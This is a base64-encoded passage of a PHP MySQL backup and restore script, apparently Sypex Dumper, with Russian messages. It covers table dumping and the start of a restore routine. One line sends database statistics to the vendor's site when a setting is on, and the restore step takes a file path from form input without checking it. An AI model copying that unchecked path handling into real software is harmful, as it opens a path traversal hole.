0LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRhYl9jaGFyc2V0WyR0YWJsZV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCdUYWJsZSBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuIENIQVJTRVQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCx0YDQsNCx0L7RgtC60LAg0YLQsNCx0LvQuNGG0YsgYHskdGFibGV9YCBbIiAuIGZuX2ludCgkdGFiaW5mb1skdGFibGVdKSAuICJdLiIpOwogICAgICAgICAgICAgICAgLy8gQ3JlYXRlIHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBDUkVBVEUgVEFCTEUgYHskdGFibGV9YCIpOwogICAgICAgICAgICAgICAgJHRhYiA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGFiID0gcHJlZ19yZXBsYWNlKCcvKGRlZmF1bHQgQ1VSUkVOVF9USU1FU1RBTVAgb24gdXBkYXRlIENVUlJFTlRfVElNRVNUQU1QfERFRkFVTFQgQ0hBUlNFVD1cdyt8Q09MTEFURT1cdyt8Y2hhcmFjdGVyIHNldCBcdyt8Y29sbGF0ZSBcdyspL2knLCAnLyohNDAxMDEgXFwxICovJywgJHRhYik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiRFJPUCBUQUJMRSBJRiBFWElTVFMgYHskdGFibGV9YDtcbnskdGFiWzFdfTtcblxuIik7CiAgICAgICAgICAgICAgICAvLyBDaGVjazogTmVlZCB0byBkdW1wIGRhdGE/CiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHRhYl90eXBlWyR0YWJsZV0sICR0aGlzLT5vbmx5X2NyZWF0ZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LTQtdC70Y/QtdC8INGC0LjQv9GLINGB0YLQvtC70LHRhtC+0LIKICAgICAgICAgICAgJE51bWVyaWNDb2x1bW4gPSBhcnJheSgpOwogICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgQ09MVU1OUyBGUk9NIGB7JHRhYmxlfWAiKTsKICAgICAgICAgICAgJGZpZWxkID0gMDsKICAgICAgICAgICAgd2hpbGUoJGNvbCA9IG15c3FsX2ZldGNoX3JvdygkcmVzdWx0KSkgewogICAgICAgICAgICAgICAgJE51bWVyaWNDb2x1bW5bJGZpZWxkKytdID0gcHJlZ19tYXRjaCgiL14oXHcqaW50fHllYXIpLyIsICRjb2xbMV0pID8gMSA6IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9ICRmaWVsZDsKICAgICAgICAgICAgJGZyb20gPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQgPSAkdGFic2l6ZVskdGFibGVdOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQyID0gcm91bmQoJGxpbWl0IC8gMyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFiaW5mb1skdGFibGVdID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmluZm9bJHRhYmxlXSA+ICRsaW1pdDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMCwgJHQgLyAkdGFiaW5mb1swXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGkgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiSU5TRVJUIElOVE8gYHskdGFibGV9YCBWQUxVRVMiKTsKICAgICAgICAgICAgd2hpbGUoKCRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSBgeyR0YWJsZX1gIExJTUlUIHskZnJvbX0sIHskbGltaXR9IikpICYmICgkdG90YWwgPSBteXNxbF9udW1fcm93cygkcmVzdWx0KSkpewogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfcm93KCRyZXN1bHQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpKys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdCsrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRrID0gMDsgJGsgPCAkZmllbGRzOyAkaysrKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE51bWVyaWNDb2x1bW5bJGtdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcm93WyRrXSA9IGlzc2V0KCRyb3dbJGtdKSA/ICRyb3dbJGtdIDogIk5VTEwiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyb3dbJGtdID0gaXNzZXQoJHJvd1ska10pID8gIiciIC4gbXlzcWxfZXNjYXBlX3N0cmluZygkcm93WyRrXSkgLiAiJyIgOiAiTlVMTCI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAoJGkgPT0gMSA/ICIiIDogIiwiKSAuICJcbigiIC4gaW1wbG9kZSgiLCAiLCAkcm93KSAuICIpIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGkgJSAkbGltaXQyID09IDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkdGFiaW5mb1skdGFibGVdLCAkdCAvICR0YWJpbmZvWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfZnJlZV9yZXN1bHQoJHJlc3VsdCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRvdGFsIDwgJGxpbWl0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZyb20gKz0gJGxpbWl0OwogICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiO1xuXG4iKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMSwgJHQgLyAkdGFiaW5mb1swXSk7fQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAkdGFiczsKICAgICAgICAgICAgICAgICR0aGlzLT5yZWNvcmRzID0gJHRhYmluZm9bMF07CiAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcCA9ICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gKiAxMCArICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXTsKICAgICAgICBlY2hvIHRwbF9zKDEsIDEpOwogICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgJHRoaXMtPmZuX2Nsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJCYWNrdXAgb2YgREI6IGB7JGRifWAgd2FzIGNyZWF0ZWQuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KDQsNC30LzQtdGAINCR0JQ6ICAgICAgICIgLiByb3VuZCgkdGhpcy0+c2l6ZSAvIDEwNDg1NzYsIDIpIC4gIiDQnNCRIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgJGZpbGVzaXplID0gcm91bmQoZmlsZXNpemUoUEFUSCAuICR0aGlzLT5maWxlbmFtZSkgLyAxMDQ4NTc2LCAyKSAuICIg0JzQkSI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJGaWxlIHNpemU6IHskZmlsZXNpemV9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KLQsNCx0LvQuNGGINC+0LHRgNCw0LHQvtGC0LDQvdC+OiB7JHRhYnN9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KHRgtGA0L7QuiDQvtCx0YDQsNCx0L7RgtCw0L3QvjogICAiIC4gZm5faW50KCR0YWJpbmZvWzBdKSwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyAiPFNDUklQVD53aXRoIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2F2ZScpKSB7c3R5bGUuZGlzcGxheSA9ICcnOyBpbm5lckhUTUwgPSAn0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsgKHskZmlsZXNpemV9KSc7IGhyZWYgPSAnIiAuIFVSTCAuICR0aGlzLT5maWxlbmFtZSAuICInOyB9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhY2snKS5kaXNhYmxlZCA9IDA7PC9TQ1JJUFQ+IjsKICAgICAgICAgICAgICAgIC8vINCf0LXRgNC10LTQsNGH0LAg0LTQsNC90L3Ri9GFINC00LvRjyDQs9C70L7QsdCw0LvRjNC90L7QuSDRgdGC0LDRgtC40YHRgtC40LrQuAogICAgICAgICAgICAgICAgaWYgKEdTKSBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdHUycpLnNyYyA9ICdodHRwOi8vc3lwZXgubmV0L2dzLnBocD9iPXskdGhpcy0+dGFic30seyR0aGlzLT5yZWNvcmRzfSx7JHRoaXMtPnNpemV9LHskdGhpcy0+Y29tcH0sMTA4Jzs8L1NDUklQVD4iOwoKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHJlc3RvcmUoKXsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBJRD1iYWNrIFRZUEU9YnV0dG9uIFZBTFVFPSfQktC10YDQvdGD0YLRjNGB0Y8nIERJU0FCTEVEIG9uQ2xpY2s9XCJoaXN0b3J5LmJhY2soKTtcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfcHJvY2Vzcygi0JLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQkdCUINC40Lcg0YDQtdC30LXRgNCy0L3QvtC5INC60L7Qv9C40LgiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMTsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddID0gaXNzZXQoJF9QT1NUWydkYl9yZXN0b3JlJ10pID8gJF9QT1NUWydkYl9yZXN0b3JlJ10gOiAnJzsKICAgICAgICAgICAgICAgICRmaWxlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ2ZpbGUnXSkgPyAkX1BPU1RbJ2ZpbGUnXSA6ICcnOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3NhdmUoKTsKICAgICAgICAgICAgICAgICRkYiA9ICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddOwoKICAgICAgICAgICAgICAgIGlmICghJGRiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkVycm9yISDQndC1INGD0LrQsNC30LDQvdCwINCx0LDQt9CwINC00LDQvdC90YvRhSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDb25uZWN0IHRvIERCIGB7JGRifWAuIik7CiAgICAgICAgICAgICAgICBteXNxbF9zZWxlY3RfZGIoJGRiKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtSDRg9C00LDQtdGC0YHRjyDQstGL0LHRgNCw0YLRjCDQsdCw0LfRgyDQtNCw0L3QvdGL0YUuPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwoKICAgICAgICAgICAgICAgIC8vINCe0L/RgNC10LTQtdC70LXQvdC40LUg0YTQvtGA0LzQsNGC0LAg0YTQsNC50LvQsAogICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiL14oLis/KVwuc3FsKFwuKGJ6MnxneikpPyQvIiwgJGZpbGUsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJG1hdGNoZXNbM10pICYmICRtYXRjaGVzWzNdID09ICdiejInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKGlzc2V0KCRtYXRjaGVzWzJdKSAmJiRtYXRjaGVzWzNdID09ICdneicpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAxOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9sZXZlbCddID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoUEFUSCAuICIveyRmaWxlfSIpKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQpNCw0LnQuyDQvdC1INC90LDQudC00LXQvSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KfRgtC10L3QuNC1INGE0LDQudC70LAgYHskZmlsZX1gLiIpOwogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSA9ICRtYXRjaGVzWzFdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQndC1INCy0YvQsdGA0LDQvSDRhNCw0LnQuyEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKHN0cl9yZXBlYXQoIi0iLCA2MCkpOwogICAgICAgICAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJGZpbGUsICJyIik7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9ICRzcWwgPSAkdGFibGUgPSAkaW5zZXJ0ID0gJyc7CiAgICAgICAgJGlzX3NrZCA9ICRxdWVyeV9sZW4gPSAkZXhlY3V0ZSA9ICRxID0kdCA9ICRpID0gJGFmZl9yb3dzID0gMDsKICAgICAgICAgICAgICAgICRsaW1pdCA9IDMwMDsKICAgICAgICAkaW5kZXggPSA0OwogICAgICAgICAgICAgICAgJHRhYnMgPSAwOwogICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAkaW5mbyA9IGFycmF5KCk7CgogICAgICAgICAgICAgICAgLy8g0KPRgdGC0LDQvdC+0LLQutCwINC60L7QtNC40YDQvtCy0LrQuCDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5teXNxbF92ZXJzaW9uID4gNDAxMDEgJiYgKENIQVJTRVQgIT0gJ2F1dG8nIHx8ICR0aGlzLT5mb3JjZWRfY2hhcnNldCkpIHsgLy8g0JrQvtC00LjRgNC+0LLQutCwINC/0L4g0YPQvNC+0LvRh9Cw0L3QuNGOLCDQtdGB0LvQuCDQsiDQtNCw0LzQv9C1INC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gImAuIiwgQ19XQVJOSU5HKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGxhc3Rfc2hvd2VkID0gJyc7CiAgICAgICAgICAgICAgICB3aGlsZSgoJHN0ciA9ICR0aGlzLT5mbl9yZWFkX3N0cigkZnApKSAhPT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHN0cikgfHwgcHJlZ19tYXRjaCgiL14oI3wtLSkvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISRpc19za2QgJiYgcHJlZ19tYXRjaCgiL14jU0tEMTAxXHwvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGluZm8gPSBleHBsb2RlKCJ8IiwgJHN0cik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAsICR0IC8gJGluZm9bNF0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzX3NrZCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcXVlcnlfbGVuICs9IHN0cmxlbigkc3RyKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGluc2VydCAmJiBwcmVnX21hdGNoKCIvXihJTlNFUlQgSU5UTyBgPyhbXmAgXSspYD8gLio/VkFMVUVTKSguKikkL2kiLCAkc3RyLCAkbSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlICE9ICRtWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9ICRtWzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KLQsNCx0LvQuNGG0LAgYHskdGFibGV9YC4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsYXN0X3Nob3dlZCA9ICR0YWJsZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfc2tkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMTAwICwgJHQgLyAkaW5mb1s0XSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRpbnNlcnQgPSAkbVsxXSAuICcgJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICRtWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmRleCsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmZvWyRpbmRleF0gPSBpc3NldCgkaW5mb1skaW5kZXhdKSA/ICRpbmZvWyRpbmRleF0gOiAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsaW1pdCA9IHJvdW5kKCRpbmZvWyRpbmRleF0gLyAyMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxpbWl0ID0gJGxpbWl0IDwgMzAwID8gMzAwIDogJGxpbWl0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaW5mb1skaW5kZXhdID4gJGxpbWl0KXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJGNhY2hlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgLj0gJHN0cjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGluc2VydCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0Kys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc19za2QgJiYgJGluZm9bJGluZGV4XSA+ICRsaW1pdCAmJiAkdCAlICRsaW1pdCA9PSAwKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkaW5zZXJ0ICYmIHByZWdfbWF0Y2goIi9eQ1JFQVRFIFRBQkxFIChJRiBOT1QgRVhJU1RTICk/YD8oW15gIF0rKWA/L2kiLCAkc3RyLCAkbSkgJiYgJHRhYmxlICE9ICRtWzJdKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFibGUgPSAkbVsyXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW5zZXJ0ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXNfY3JlYXRlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzcWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvOyQvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9IHJ0cmltKCRpbnNlcnQgLiAkc3FsLCAiOyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRpbnNlcnQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA8IDQwMTAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi9FTkdJTkVccz89LyIsICJUWVBFPSIsICRzcWwpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAocHJlZ19tYXRjaCgiL0NSRUFURSBUQUJMRS9pIiwgJHNxbCkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vINCS0YvRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSsoXHcrKS9pIiwgJHNxbCwgJGNoYXJzZXQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5mb3JjZWRfY2hhcnNldCAmJiAkY2hhcnNldFsyXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDSEFSU0VUID09ICdhdXRvJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkY2hhcnNldFsyXSAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkY2hhcnNldFsyXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI